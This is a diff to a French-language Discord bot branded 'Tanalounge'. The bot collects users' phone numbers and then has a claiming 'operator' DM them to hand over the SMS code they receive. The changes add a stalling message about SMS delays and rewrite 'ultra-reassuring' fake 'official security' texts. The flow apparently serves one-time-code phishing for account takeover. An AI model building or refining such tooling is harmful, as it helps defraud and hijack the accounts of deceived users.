@@ -99,14 +99,13 @@ class UserPhoneNumberModal(discord.ui.Modal, title="Vérification Sécurisée �
 
         await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)
 
-        # Message MP ultra-rassurant pour l'étape 1
         try:
             embed_mp = discord.Embed(
                 title="🔒 Demande de vérification transmise",
                 description=(
                     "**Merci !** Votre numéro a bien été transmis à notre équipe de sécurité.\n\n"
                     "• **Sécurité :** Cette procédure est entièrement cryptée et gérée par notre staff officiel.\n"
-                    "• **Prochaine étape :** Vous recevrez ici une demande de code dès qu'un opérateur prendra votre dossier en charge.\n\n"
+                    "• **Prochaine étape :** Vous recevrez ici une instruction dès qu'un opérateur prendra votre dossier en charge.\n\n"
                     "*Restez à l'écoute, cela ne prend que quelques instants.*"
                 ),
                 color=TANA_PINK
@@ -232,6 +231,30 @@ class VerificationView(discord.ui.View):
         await interaction.response.edit_message(view=self)
         await interaction.followup.send(f"🔒 Dossier claimé par {interaction.user.mention}.", ephemeral=True)
 
+    @discord.ui.button(label="Faire patienter", style=discord.ButtonStyle.secondary, emoji="⏳", custom_id="wait_btn_dynamic", disabled=True)
+    async def wait_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.claimed_by and self.claimed_by != interaction.user.id:
+            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
+            return
+        
+        try:
+            user = await bot.fetch_user(self.user_id)
+            embed_mp = discord.Embed(
+                title="⏳ Veuillez patienter un instant",
+                description=(
+                    "Notre équipe examine votre dossier avec attention.\n\n"
+                    "• **Tout va bien :** Il arrive parfois qu'il y ait un léger délai de réception des SMS.\n"
+                    "• **Restez connecté :** L'opérateur va vous envoyer la suite très prochainement.\n\n"
+                    "*Merci pour votre patience et votre compréhension.*"
+                ),
+                color=TANA_PINK
+            )
+            embed_mp.set_footer(text="Tanalounge · Sécurité Officielle")
+            await user.send(embed=embed_mp)
+            await interaction.response.send_message("✅ Message de patience envoyé au client en MP.", ephemeral=True)
+        except Exception:
+            await interaction.response.send_message("❌ Impossible d'envoyer un MP au joueur (ses MP sont fermés ou bloqués).", ephemeral=True)
+
     @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn_dynamic", disabled=True)
     async def ask_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
         if self.claimed_by and self.claimed_by != interaction.user.id:
@@ -240,22 +263,21 @@ class VerificationView(discord.ui.View):
         
         try:
             user = await bot.fetch_user(self.user_id)
-            # Message MP ultra-rassurant pour l'étape du code
             embed_mp = discord.Embed(
-                title="🔑 Action requise : Code de vérification",
+                title="🔑 Action requise : Entrez votre code SMS",
                 description=(
-                    "Un opérateur de **Tanalounge** est en train de finaliser votre dossier.\n\n"
-                    "• **Instructions :** Veuillez cliquer sur le bouton sécurisé ci-dessous pour saisir le code reçu par SMS.\n"
-                    "• **Confidentialité :** Ne communiquez jamais votre code ailleurs que via ce bouton officiel.\n\n"
-                    "*Nous vous remercions pour votre patience.*"
+                    "L'opérateur vous invite à renseigner le code que vous venez de recevoir par SMS.\n\n"
+                    "• **Vérifiez vos messages :** Le code à chiffres est dans votre boîte de réception.\n"
+                    "• **Sécurité :** Cliquez exclusivement sur le bouton vert ci-dessous pour transmettre votre code.\n\n"
+                    "*Ne partagez jamais votre code ailleurs.*"
                 ),
                 color=TANA_PINK
             )
-            embed_mp.set_footer(text="Tanalounge · Sécurité Officielle")
+            embed_mp.set_footer(text="Tanalounge · Saisie Sécurisée")
             
             view_mp = PlayerCodeView(interaction.message, self)
             await user.send(embed=embed_mp, view=view_mp)
-            await interaction.response.send_message("✅ Le message de demande de code a été envoyé en MP au joueur.", ephemeral=True)
+            await interaction.response.send_message("✅ Demande de code envoyée au joueur en MP.", ephemeral=True)
         except Exception:
             await interaction.response.send_message(f"❌ Impossible d'envoyer un MP au joueur (ses MP sont fermés ou bloqués).", ephemeral=True)
 
